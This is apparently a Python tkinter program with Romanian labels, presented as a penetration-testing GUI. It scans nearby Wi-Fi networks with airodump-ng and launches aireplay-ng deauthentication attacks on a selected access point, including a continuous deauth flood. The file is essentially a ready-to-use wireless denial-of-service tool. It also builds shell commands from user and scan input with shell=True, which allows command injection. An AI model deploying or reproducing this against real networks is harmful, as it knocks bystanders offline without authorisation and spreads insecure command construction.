import os
import tkinter as tk
from tkinter import messagebox, scrolledtext
from threading import Thread
import subprocess
import time

# Variabilă globală pentru a controla scanarea
scanning = False

def start_monitor():
    global scanning
    interface = interface_entry.get().strip()
    if not interface:
        messagebox.showerror("Eroare", "Introdu o interfață validă.")
        return

    check_interface = os.popen(f"iwconfig {interface}").read()
    if "no wireless extensions" in check_interface:
        messagebox.showerror("Eroare", "Interfața invalidă sau nu suportă Wi-Fi.")
        return

    # Activăm monitor mode
    os.system(f"airmon-ng start {interface}")
    output_text.insert(tk.END, "[INFO] Monitor mode pornit.\n")
    scanning = True
    Thread(target=scan_networks, args=(interface,)).start()

def stop_monitor():
    global scanning
    interface = interface_entry.get().strip()
    if interface:
        scanning = False
        os.system(f"airmon-ng stop {interface}mon")
        output_text.insert(tk.END, "[INFO] Monitor mode oprit.\n")
        network_listbox.delete(0, tk.END)
    else:
        messagebox.showerror("Eroare", "Introdu o interfață validă.")

def scan_networks(interface):
    network_listbox.delete(0, tk.END)
    csv_file = "/tmp/networks-01.csv"
    
    while scanning:
        os.system(f"timeout 2 airodump-ng {interface}mon -w /tmp/networks --output-format csv")
        
        try:
            with open(csv_file, "r", encoding="utf-8", errors="ignore") as f:
                lines = f.readlines()
        except FileNotFoundError:
            time.sleep(1)
            continue
        
        for line in lines[2:]:
            if line.strip():
                parts = line.split(',')
                if len(parts) > 13:
                    bssid = parts[0].strip()
                    channel = parts[3].strip()
                    essid = parts[13].strip()
                    network_str = f"{essid} ({bssid}) - canal {channel}"
                    if network_str not in network_listbox.get(0, tk.END):
                        network_listbox.insert(tk.END, network_str)
        
        time.sleep(1)

def execute_command(command):
    output_text.insert(tk.END, f"[EXEC] {command}\n")
    def run_command():
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True)
        for line in iter(process.stdout.readline, ""):
            output_text.insert(tk.END, line)
            output_text.see(tk.END)
        process.stdout.close()
        process.wait()

    Thread(target=run_command).start()

def attack_deauth():
    selected = network_listbox.get(tk.ACTIVE)
    if not selected:
        messagebox.showerror("Eroare", "Selectează o rețea pentru atacul deauth.")
        return

    try:
        essid, rest = selected.split(" (")
        bssid, channel = rest.split(") - canal ")
        interface = interface_entry.get().strip()

        output_text.insert(tk.END, f"[INFO] Lansare atac deauth pe {essid} ({bssid})...\n")
        execute_command(f"aireplay-ng --deauth 10 -a {bssid} {interface}mon")
    except Exception as e:
        messagebox.showerror("Eroare", f"Eroare la atacul deauth: {e}")

def continuous_deauth():
    selected = network_listbox.get(tk.ACTIVE)
    if not selected:
        messagebox.showerror("Eroare", "Selectează o rețea pentru atacul deauth continuu.")
        return

    try:
        essid, rest = selected.split(" (")
        bssid, channel = rest.split(") - canal ")
        interface = interface_entry.get().strip()

        output_text.insert(tk.END, f"[INFO] Lansare atac deauth continuu pe {essid} ({bssid})...\n")
        execute_command(f"aireplay-ng --deauth 0 -a {bssid} {interface}mon")
    except Exception as e:
        messagebox.showerror("Eroare", f"Eroare la atacul deauth continuu: {e}")

def stop_deauth():
    output_text.insert(tk.END, "[INFO] Oprire atac deauth flood.\n")
    os.system("killall aireplay-ng")

# ---------------- Creare interfață grafică ----------------
root = tk.Tk()
root.title("Penetration Testing Complex - GUI")
root.geometry("800x600")
root.configure(bg="black")

top_frame = tk.Frame(root, bg="black")
top_frame.pack(side=tk.TOP, fill=tk.X, padx=20, pady=10)

tk.Label(top_frame, text="Interfață Wi-Fi:", bg="black", fg="white").pack(side=tk.LEFT, padx=5)
interface_entry = tk.Entry(top_frame, bg="black", fg="white", insertbackground="white")
interface_entry.pack(side=tk.LEFT, padx=5)
tk.Button(top_frame, text="Porneste Monitor Mode", command=start_monitor, bg="black", fg="white").pack(side=tk.LEFT, padx=5)
tk.Button(top_frame, text="Opreste Monitor Mode", command=stop_monitor, bg="black", fg="white").pack(side=tk.LEFT, padx=5)

middle_frame = tk.Frame(root, bg="black")
middle_frame.pack(side=tk.TOP, fill=tk.BOTH, expand=True, padx=20, pady=10)

left_frame = tk.Frame(middle_frame, bg="black")
left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=10)
tk.Label(left_frame, text="Live Output", bg="black", fg="white").pack(anchor="w")
output_text = scrolledtext.ScrolledText(left_frame, bg="black", fg="white")
output_text.pack(fill=tk.BOTH, expand=True)

right_frame = tk.Frame(middle_frame, bg="black")
right_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=10)
tk.Label(right_frame, text="Rețele Disponibile", bg="black", fg="white").pack(anchor="w")
network_listbox = tk.Listbox(right_frame, bg="black", fg="white")
network_listbox.pack(fill=tk.BOTH, expand=True)

bottom_frame = tk.Frame(root, bg="black")
bottom_frame.pack(side=tk.BOTTOM, fill=tk.X, padx=20, pady=10)

tk.Button(bottom_frame, text="Atac Deauth", command=attack_deauth, bg="black", fg="white").pack(side=tk.LEFT, padx=10)
tk.Button(bottom_frame, text="Deauth Flood Continuu", command=continuous_deauth, bg="black", fg="white").pack(side=tk.LEFT, padx=10)
tk.Button(bottom_frame, text="Opreste Deauth", command=stop_deauth, bg="black", fg="white").pack(side=tk.LEFT, padx=10)

root.mainloop()
